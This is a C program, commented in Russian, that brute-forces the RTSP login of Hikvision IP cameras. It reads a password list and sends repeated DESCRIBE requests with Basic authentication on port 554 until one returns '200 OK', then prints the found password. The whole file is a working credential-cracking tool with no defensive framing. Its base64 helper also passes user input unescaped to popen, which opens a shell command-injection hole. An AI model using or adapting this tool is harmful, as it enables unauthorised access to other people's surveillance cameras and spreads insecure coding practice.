#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define BUFFER_SIZE 2048
#define PASSWORD_LENGTH 100

// Base64 через системный вызов (подходит для Termux)
char *base64_encode(const char *input) {
    char command[BUFFER_SIZE];
    char *result = malloc(BUFFER_SIZE);
    FILE *fp;

    snprintf(command, sizeof(command), "echo -n \"%s\" | base64", input);
    fp = popen(command, "r");
    if (!fp) {
        perror("Ошибка при запуске base64");
        free(result);
        return NULL;
    }

    fgets(result, BUFFER_SIZE, fp);
    result[strcspn(result, "\n")] = '\0';

    pclose(fp);
    return result;
}

// Отправка DESCRIBE запроса и проверка ответа
int rtsp_bruteforce(const char *target_ip, int target_port, const char *username, const char *password) {
    int sock;
    struct sockaddr_in server_addr;
    char request[BUFFER_SIZE];
    char response[BUFFER_SIZE];
    char userpass[200];

    snprintf(userpass, sizeof(userpass), "%s:%s", username, password);
    char *auth_encoded = base64_encode(userpass);
    if (!auth_encoded) return 0;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Ошибка создания сокета");
        free(auth_encoded);
        return 0;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip, &server_addr.sin_addr);

    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Ошибка подключения");
        close(sock);
        free(auth_encoded);
        return 0;
    }

    snprintf(request, sizeof(request),
             "DESCRIBE rtsp://%s/ RTSP/1.0\r\n"
             "CSeq: 2\r\n"
             "Accept: application/sdp\r\n"
             "Authorization: Basic %s\r\n\r\n",
             target_ip, auth_encoded);

    send(sock, request, strlen(request), 0);
    int bytes_received = recv(sock, response, sizeof(response) - 1, 0);
    if (bytes_received < 0) {
        perror("Ошибка при получении ответа");
        close(sock);
        free(auth_encoded);
        return 0;
    }
    response[bytes_received] = '\0';

    if (strstr(response, "200 OK")) {
        printf("\033[0;32m[✔] Найден пароль: %s\033[0m\n", password);
        close(sock);
        free(auth_encoded);
        return 1;
    } else if (strstr(response, "401 Unauthorized")) {
        printf("\033[0;31m[✘] Отказ в доступе: %s\033[0m\n", password);
    } else {
        printf("\033[0;33m[?] Неожданный ответ: %s\033[0m\n", password);
    }

    close(sock);
    free(auth_encoded);
    return 0;
}

int main() {
    char target_ip[64];
    int target_port = 554;
    char username[100];
    char password[PASSWORD_LENGTH];

    printf("Введите IP RTSP сервера Hikvision: ");
    scanf("%63s", target_ip);
    getchar();

    printf("Введите логин (обычно 'admin'): ");
    fgets(username, sizeof(username), stdin);
    username[strcspn(username, "\n")] = '\0';

    FILE *file = fopen("passwords.txt", "r");
    if (!file) {
        perror("Ошибка: файл passwords.txt не найден");
        return 1;
    }

    printf("\nЗапуск брутфорса...\n\n");

    while (fgets(password, PASSWORD_LENGTH, file)) {
        password[strcspn(password, "\n")] = 0;

        if (rtsp_bruteforce(target_ip, target_port, username, password)) {
            printf("\n\033[1;34m[*] Успешная аутентификация: %s\033[0m\n", password);
            break;
        }

        sleep(1);
    }

    fclose(file);
    return 0;
}
